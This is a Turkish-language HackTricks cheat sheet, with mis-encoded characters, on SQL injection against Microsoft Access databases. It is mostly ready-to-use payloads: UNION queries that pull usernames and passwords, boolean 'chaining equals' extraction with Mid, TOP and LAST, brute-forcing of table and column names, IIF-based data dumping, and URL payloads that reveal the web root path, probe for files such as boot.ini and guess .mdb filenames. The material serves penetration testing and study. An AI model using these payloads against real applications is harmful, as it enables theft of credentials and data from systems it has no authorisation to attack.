# MS Access SQL Injection

<details>

<summary><strong>AWS hackleme becerilerinizi sÄ±fÄ±rdan kahraman seviyesine Ã§Ä±karÄ±n</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi **HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** isterseniz, [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **pull request** gÃ¶ndererek paylaÅŸÄ±n.

</details>

## Ã‡evrimiÃ§i Oyun AlanÄ±

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## DB SÄ±nÄ±rlamalarÄ±

### Dize BirleÅŸtirme

Dize birleÅŸtirme iÅŸlemi `& (%26)` ve `+ (%2b)` karakterleriyle mÃ¼mkÃ¼ndÃ¼r.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Yorumlar

MS Access'te yorumlar bulunmamaktadÄ±r, ancak gÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re bir sorgunun sonunu NULL karakteriyle kaldÄ±rmak mÃ¼mkÃ¼ndÃ¼r:
```sql
1' union select 1,2 from table%00
```
EÄŸer bu Ã§alÄ±ÅŸmÄ±yorsa, her zaman sorgunun sÃ¶zdizimini dÃ¼zeltebilirsiniz:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### YÄ±ÄŸÄ±lmÄ±ÅŸ Sorgular

Desteklenmezler.

### LIMIT

**`LIMIT`** operatÃ¶rÃ¼ **uygulanmamÄ±ÅŸtÄ±r**. Bununla birlikte, `TOP` operatÃ¶rÃ¼nÃ¼ kullanarak SELECT sorgusu sonuÃ§larÄ±nÄ± **ilk N tablo satÄ±rÄ±yla sÄ±nÄ±rlamak mÃ¼mkÃ¼ndÃ¼r**. `TOP`, dÃ¶ndÃ¼rÃ¼lecek satÄ±r sayÄ±sÄ±nÄ± temsil eden bir tamsayÄ±yÄ± argÃ¼man olarak kabul eder.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
TOP gibi **`LAST`** kullanabilirsiniz, bu da **sondaki satÄ±rlarÄ±** alÄ±r.

## UNION SorgularÄ±/Alt sorgular

SQLi'da genellikle baÅŸka tablolardan bilgi Ã§Ä±karmak iÃ§in yeni bir sorgu yÃ¼rÃ¼tmek istersiniz. MS Access her zaman **alt sorgularda veya ek sorgularda bir `FROM` belirtilmesini gerektirir**.\
Bu nedenle, bir koÅŸulda `UNION SELECT` veya `UNION ALL SELECT` veya parantez iÃ§inde bir `SELECT` yÃ¼rÃ¼tmek istiyorsanÄ±z, her zaman geÃ§erli bir tablo adÄ±yla bir `FROM` belirtmeniz gerekir.\
Bu nedenle, bir **geÃ§erli tablo adÄ±** bilmelisiniz.
```sql
-1' UNION SELECT username,password from users%00
```
### EÅŸitlik Zincirleme + Alt Dize

{% hint style="warning" %}
Bu, tablonun adÄ±nÄ± bilmeye gerek duymadan mevcut tablonun deÄŸerlerini dÄ±ÅŸarÄ± Ã§Ä±karmanÄ±za olanak saÄŸlar.
{% endhint %}

**MS Access**, **`'1'=2='3'='asd'=false`** gibi garip sÃ¶zdizimine izin verir. Genellikle SQL enjeksiyonu bir **`WHERE`** ifadesi iÃ§inde olacaÄŸÄ±ndan, bunu istismar edebiliriz.

Bir MS Access veritabanÄ±nda SQLi olduÄŸunu ve bir **sÃ¼tun adÄ±nÄ±n kullanÄ±cÄ± adÄ±** olduÄŸunu bildiÄŸinizi (veya tahmin ettiÄŸinizi) varsayalÄ±m ve dÄ±ÅŸarÄ± Ã§Ä±karmak istediÄŸiniz alan budur. EÅŸitlik zincirleme tekniÄŸi kullanÄ±ldÄ±ÄŸÄ±nda web uygulamasÄ±nÄ±n farklÄ± yanÄ±tlarÄ±nÄ± kontrol edebilir ve **`Mid`** iÅŸlevini kullanarak alt dizeleri alarak iÃ§eriÄŸi potansiyel olarak dÄ±ÅŸarÄ± Ã§Ä±karabilirsiniz.
```sql
'=(Mid(username,1,3)='adm')='
```
EÄŸer dÃ¶kÃ¼lecek tablonun ve sÃ¼tunun adÄ±nÄ± biliyorsanÄ±z, boolean SQLi aracÄ±lÄ±ÄŸÄ±yla tÃ¼m bilgileri sÄ±zdÄ±rmak iÃ§in `Mid`, `LAST` ve `TOP` arasÄ±nda bir kombinasyon kullanabilirsiniz:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Online oyun alanÄ±nda bunu kontrol etmekten Ã§ekinmeyin._

### Tablo Ä°simlerini Kaba Kuvvet YÃ¶ntemiyle Bulma

Zincirleme eÅŸitlik tekniÄŸini kullanarak aÅŸaÄŸÄ±daki gibi bir ÅŸeyle de **tablo isimlerini kaba kuvvet yÃ¶ntemiyle bulabilirsiniz**:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
AyrÄ±ca daha geleneksel bir yÃ¶ntem de kullanabilirsiniz:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Online oyun alanÄ±nda bunu kontrol etmekten Ã§ekinmeyin._

* Sqlmap yaygÄ±n tablo adlarÄ±: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* BaÅŸka bir liste [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html) adresinde bulunmaktadÄ±r.

### SÃ¼tun AdlarÄ±nÄ± Kaba Kuvvet YÃ¶ntemiyle Bulma

Mevcut sÃ¼tun adlarÄ±nÄ± **eÅŸitlik zinciri hilesiyle kaba kuvvet yÃ¶ntemiyle bulabilirsiniz**.
```sql
'=column_name='
```
Veya bir **group by** ile:
```sql
-1' GROUP BY column_name%00
```
Veya farklÄ± bir tablonun sÃ¼tun isimlerini brute-force yÃ¶ntemiyle deneyebilirsiniz:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Veri dÃ¶kÃ¼mÃ¼

Zaten [**eÅŸitlik zinciri tekniÄŸini**](ms-access-sql-injection.md#chaining-equals-+-substring) **mevcut ve diÄŸer tablolardan veri dÃ¶kÃ¼mlemek iÃ§in** tartÄ±ÅŸtÄ±k. Ancak baÅŸka yollar da vardÄ±r:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
KÄ±sacasÄ±, sorgu baÅŸarÄ±lÄ± olduÄŸunda "200 OK" tetiklemek iÃ§in bir "if-then" ifadesi kullanÄ±r veya aksi halde "500 Internal Error" tetikler. TOP 10 operatÃ¶rÃ¼nden faydalanarak ilk on sonucu seÃ§mek mÃ¼mkÃ¼ndÃ¼r. LAST'in ardÄ±ndan kullanÄ±lan, sadece 10. tuple'Ä± dikkate almayÄ± saÄŸlar. Bu deÄŸeri kullanarak MID operatÃ¶rÃ¼ kullanarak basit bir karakter karÅŸÄ±laÅŸtÄ±rmasÄ± yapÄ±labilir. MID ve TOP'un dizinini uygun ÅŸekilde deÄŸiÅŸtirerek, tÃ¼m satÄ±rlar iÃ§in "username" alanÄ±nÄ±n iÃ§eriÄŸini alabiliriz.

### Zaman Temelli

[https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN) adresinde kontrol edin.

### DiÄŸer Ä°lginÃ§ fonksiyonlar

* `Mid('admin',1,1)` 1. pozisyondan 1 uzunluÄŸunda alt dize alÄ±r (baÅŸlangÄ±Ã§ pozisyonu 1'dir)
* `LEN('1234')` dizenin uzunluÄŸunu alÄ±r
* `ASC('A')` karakterin ascii deÄŸerini alÄ±r
* `CHR(65)` ascii deÄŸerinden dize alÄ±r
* `IIF(1=1,'a','b')` eÄŸer sonra
* `COUNT(*)` Ã–ÄŸe sayÄ±sÄ±nÄ± sayar

## TablolarÄ± NumaralandÄ±rma

[**Buradan**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) tablo isimlerini almak iÃ§in bir sorgu gÃ¶rebilirsiniz:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
Ancak, SQL EnjeksiyonlarÄ±na **`MSysObjects` tablosunu okuma eriÅŸiminizin olmadÄ±ÄŸÄ±** durumlar Ã§ok yaygÄ±ndÄ±r.

## Dosya Sistemi EriÅŸimi

### Web KÃ¶k Dizin Tam Yolu

**Web kÃ¶k dizininin mutlak yolunu bilmek**, daha fazla saldÄ±rÄ±yÄ± kolaylaÅŸtÄ±rabilir. Uygulama hatalarÄ± tamamen gizlenmediyse, dizin yolunu ortaya Ã§Ä±karmak iÃ§in mevcut olmayan bir veritabanÄ±ndan veri seÃ§meye Ã§alÄ±ÅŸarak bulunabilir.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access, **web dizini tam yolunu iÃ§eren bir hata mesajÄ±yla yanÄ±t verir**.

### Dosya NumaralandÄ±rma

AÅŸaÄŸÄ±daki saldÄ±rÄ± vektÃ¶rÃ¼, **uzak dosya sisteminde bir dosyanÄ±n varlÄ±ÄŸÄ±nÄ± Ã§Ä±karabilir**. Belirtilen dosya varsa, MS Access, veritabanÄ± formatÄ±nÄ±n geÃ§ersiz olduÄŸunu bildiren bir hata mesajÄ± tetikler:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

DosyalarÄ±n numaralandÄ±rÄ±lmasÄ± iÃ§in baÅŸka bir yol, **bir veritabanÄ±.tablo Ã¶ÄŸesi belirtmektir**. **Belirtilen dosya varsa**, MS Access, **bir veritabanÄ± formatÄ± hatasÄ± mesajÄ±** gÃ¶rÃ¼ntÃ¼ler.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### .mdb Dosya AdÄ± Tahmini

**VeritabanÄ± dosya adÄ± (.mdb)** aÅŸaÄŸÄ±daki sorgu ile tahmin edilebilir:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Burada **name\[i] bir .mdb dosya adÄ±dÄ±r** ve **realTable veritabanÄ±nda mevcut bir tablodur**. MS Access her zaman bir hata mesajÄ± tetikleyeceÄŸi iÃ§in, geÃ§ersiz bir dosya adÄ± ile geÃ§erli bir .mdb dosya adÄ± arasÄ±nda ayrÄ±m yapmak mÃ¼mkÃ¼ndÃ¼r.

### .mdb Åifre KÄ±rÄ±cÄ±

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html), Microsoft Access 95/97/2000/XP veya Jet Database Engine 3.0/4.0'in ana veritabanÄ± ÅŸifresini kurtarmak iÃ§in kullanÄ±lan Ã¼cretsiz bir araÃ§tÄ±r.

## Referanslar

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live) **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
